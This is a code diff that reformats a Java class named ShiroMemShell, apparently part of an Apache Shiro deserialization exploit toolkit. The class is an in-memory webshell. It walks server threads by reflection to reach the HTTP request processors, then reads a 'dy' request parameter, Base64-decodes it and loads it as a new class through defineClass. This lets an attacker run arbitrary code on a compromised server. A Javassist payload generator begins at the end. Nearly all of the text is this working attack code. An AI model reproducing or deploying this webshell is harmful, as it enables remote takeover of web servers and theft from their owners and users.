@@ -9,10 +9,71 @@ import org.apache.shiro.codec.Base64;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.List;
+
 public class ShiroMemShell {
     private static Object getFV(Object o, String s) throws Exception {
-        Field f = null; Class clazz = o.getClass();while (clazz != Object.class) {try {f = clazz.getDeclaredField(s);break;} catch (NoSuchFieldException var5) {clazz = clazz.getSuperclass();}}if (f == null) {throw new NoSuchFieldException(s);} else {f.setAccessible(true);return f.get(o);}}
-    public ShiroMemShell() {try {String dy = null;boolean done = false;Thread[] ts = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads"));for (int i = 0; i < ts.length; ++i) {Thread t = ts[i];if (t != null) {String s = t.getName();if (!s.contains("exec") && s.contains("http")) {Object o = getFV(t, "target");if (o instanceof Runnable) {try {o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");} catch (Exception var16) {continue;}List ps = (List) getFV(o, "processors");for (int j = 0; j < ps.size(); ++j) {Object p = ps.get(j);o = getFV(p, "req");Object resp = o.getClass().getMethod("getResponse").invoke(o);Object conreq = o.getClass().getMethod("getNote", Integer.TYPE).invoke(o, new Integer(1));dy = (String) conreq.getClass().getMethod("getParameter", String.class).invoke(conreq, new String("dy"));if (dy != null && !dy.isEmpty()) {System.out.println("dy:" +dy);byte[] bytecodes = Base64.decode(dy);Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);defineClassMethod.setAccessible(true);Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), bytecodes, new Integer(0), new Integer(bytecodes.length));cc.newInstance().equals(conreq);done = true;}if (done) {break;}}}}}}} catch (Exception var17) {}}
+        Field f = null;
+        Class clazz = o.getClass();
+        while (clazz != Object.class) {
+            try {
+                f = clazz.getDeclaredField(s);
+                break;
+            } catch (NoSuchFieldException var5) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        if (f == null) {
+            throw new NoSuchFieldException(s);
+        } else {
+            f.setAccessible(true);
+            return f.get(o);
+        }
+    }
+
+    public ShiroMemShell() {
+        try {
+            String dy = null;
+            boolean done = false;
+            Thread[] ts = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads"));
+            for (int i = 0; i < ts.length; ++i) {
+                Thread t = ts[i];
+                if (t != null) {
+                    String s = t.getName();
+                    if (!s.contains("exec") && s.contains("http")) {
+                        Object o = getFV(t, "target");
+                        if (o instanceof Runnable) {
+                            try {
+                                o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");
+                            } catch (Exception var16) {
+                                continue;
+                            }
+                            List ps = (List) getFV(o, "processors");
+                            for (int j = 0; j < ps.size(); ++j) {
+                                Object p = ps.get(j);
+                                o = getFV(p, "req");
+                                Object resp = o.getClass().getMethod("getResponse").invoke(o);
+                                Object conreq = o.getClass().getMethod("getNote", Integer.TYPE).invoke(o, new Integer(1));
+                                dy = (String) conreq.getClass().getMethod("getParameter", String.class).invoke(conreq, new String("dy"));
+                                if (dy != null && !dy.isEmpty()) {
+                                    System.out.println("dy:" + dy);
+                                    byte[] bytecodes = Base64.decode(dy);
+                                    Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
+                                    defineClassMethod.setAccessible(true);
+                                    Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), bytecodes, new Integer(0), new Integer(bytecodes.length));
+                                    cc.newInstance().equals(conreq);
+                                    done = true;
+                                }
+                                if (done) {
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (Exception var17) {
+        }
+    }
 
     public CtClass genPayload(ClassPool pool) throws Exception {
         CtClass clazz = pool.makeClass("x.Test" + System.nanoTime());
